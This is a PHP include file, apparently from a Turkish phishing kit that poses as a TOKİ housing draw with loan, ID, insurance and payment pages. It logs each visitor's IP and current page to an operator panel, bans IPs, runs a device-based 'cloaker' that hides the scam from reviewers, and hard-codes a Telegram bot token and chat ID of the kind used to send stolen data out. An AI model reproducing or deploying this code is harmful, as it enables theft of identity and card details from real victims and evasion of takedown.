<?php
$ip = $_SERVER['REMOTE_ADDR'];
require_once 'brain.php'; 

$botToken = '8402537189:AAEnqBvtTXsrE6FCR_868xH4VZc0DN4kv1I';
$chatId = '7534340801';

try {
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $current_timestamp = time();

    $dosya_adi = basename($_SERVER['PHP_SELF']); 
    $sayfa_adi = 'Bilinmiyor'; 

    switch ($dosya_adi) {
        case 'index.php':
            $sayfa_adi = 'Ana Sayfa (Giriş)';
            break;
        case 'arsa.php':
            $sayfa_adi = 'Arsa Giriş';
            break;
        case 'arsa0.php':
            $sayfa_adi = 'Arsa Sayfası 1';
            break;
        case 'arsa2.php':
            $sayfa_adi = 'Arsa Sayfası 2';
            break;
        case 'arsa3.php':
            $sayfa_adi = 'Arsa Sayfası 3';
            break;
        case 'isyeri.php':
            $sayfa_adi = 'İşyeri Giriş';
            break;
        case 'isyeri0.php':
            $sayfa_adi = 'İşyeri Sayfası 1';
            break;
        case 'isyeri2.php':
            $sayfa_adi = 'İşyeri Sayfası 2';
            break;
        case 'isyeri3.php':
            $sayfa_adi = 'İşyeri Sayfası 3';
            break;
        case 'konut.php':
            $sayfa_adi = 'Konut Giriş';
            break;
        case 'konut0.php':
            $sayfa_adi = 'Konut Sayfası 1';
            break;
        case 'konut2.php':
            $sayfa_adi = 'Konut Sayfası 2';
            break;
        case 'konut3.php':
            $sayfa_adi = 'Konut Sayfası 3';
            break;
        case 'kredi.php':
            $sayfa_adi = 'Kredi Sayfası';
            break;
        case 'kredi2.php':
            $sayfa_adi = 'Kredi Onay';
            break;
        case 'kimlik.php':
            $sayfa_adi = 'Kimlik Bilgileri';
            break;
        case 'tebrik.php':
            $sayfa_adi = 'Tebrik Sayfası';
            break;
        case 'teminat.php':
            $sayfa_adi = 'Teminat Bilgileri';
            break;
        case 'ozel_mesaj.php':
            $sayfa_adi = 'Özel Mesaj Sayfası';
            break;
        case 'police.php':
            $sayfa_adi = 'Poliçe Bilgileri';
            break;
        case 'toki.php':
            $sayfa_adi = 'TOKİ Seçim Kısmı';
            break;
        case 'indirim.php':
            $sayfa_adi = 'İndirim Sayfası';
            break;
        case 'redirect.php':
            $sayfa_adi = 'Yönlendirme';
            break;
        case 'robots.php':
            $sayfa_adi = 'Robots Dosyası';
            break;
        case 'son.php':
            $sayfa_adi = 'Son Adım';
            break;
        case 'arsa.php':
            $sayfa_adi = 'Arsa Giriş';
            break;
        case '1binfo.php':
            $sayfa_adi = 'Ödeme Kısmı (1)';
            break;
        case '1binfo2.php':
            $sayfa_adi = 'Ödeme Kısmı (2)';
            break;
        case '1binfopay.php':
            $sayfa_adi = 'Ödeme Kısmı (3)';
            break;
        case '1binfopay2.php':
            $sayfa_adi = 'Ödeme Kısmı (4)';
            break;
        default:
            $sayfa_adi = ucfirst(pathinfo($dosya_adi, PATHINFO_FILENAME)) . ' Sayfası';
            break;
    }

    $sql = "UPDATE logs 
            SET aktif_check = :aktif_check, mevcut_sayfa = :mevcut_sayfa 
            WHERE ip_address = :ip_address 
            ORDER BY id DESC 
            LIMIT 1";

    $stmt = $pdo->prepare($sql);
    $stmt->execute([
        ':aktif_check' => $current_timestamp,
        ':mevcut_sayfa' => $sayfa_adi, 
        ':ip_address' => $ip_address
    ]);

} catch (PDOException $e) {
}

$stmt = $pdo->prepare("SELECT 1 FROM banned WHERE ip_address = ?");
$stmt->execute([$ip]);
if ($stmt->fetch()) {
    header("Location: inc/banned-page.php");
    exit;
}

$stmt = $pdo->query("SELECT site_aktif FROM panel LIMIT 1");
$row = $stmt->fetch(PDO::FETCH_ASSOC);
$site_aktif = $row ? (int)$row['site_aktif'] : 1;
if ($site_aktif === 0) {
    header("Location: inc/close-page.php");
    exit;
}

$stmt = $pdo->query("SELECT cloaker_aktif, cihaz_access, referans_access, role FROM panel LIMIT 1");
$settings = $stmt->fetch(PDO::FETCH_ASSOC);

$cloaker_aktif = $settings ? (int)$settings['cloaker_aktif'] : 0;
$cihaz_access = $settings ? $settings['cihaz_access'] : 'both'; 
$referans_access = $settings ? (int)$settings['referans_access'] : 0;
$site_role = $settings ? (int)$settings['role'] : 1;

if ($site_role === 2) {
    header("Location: basvuru.php");
    exit;
}

function isMobile() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $mobileAgents = ['Android', 'iPhone', 'iPad', 'iPod', 'Opera Mini', 'IEMobile', 'Mobile'];
    foreach ($mobileAgents as $agent) {
        if (stripos($userAgent, $agent) !== false) {
            return true;
        }
    }
    return false;
}

if ($cloaker_aktif === 1) {
    $isMobile = isMobile();

    if ($cihaz_access === 'mobil' && !$isMobile) {
        header("Location: ../bilgi.php");
        exit;
    } elseif ($cihaz_access === 'masaüstü' && $isMobile) {
        header("Location: inc/please-pc.php");
        exit;
    }
}

if ($referans_access === 1) {
    if (isset($_GET['id'])) {
        $endpoint = $_GET['id'];
        $stmt = $pdo->prepare("SELECT 1 FROM panel WHERE referans_kodu = ?");
        $stmt->execute([$endpoint]);
        if ($stmt->fetch()) {
            echo "TRUE";
        } else {
            echo "FALSE";
        }
    } else {
        echo "NO_ENDPOINT";
    }
    exit;
}
?>
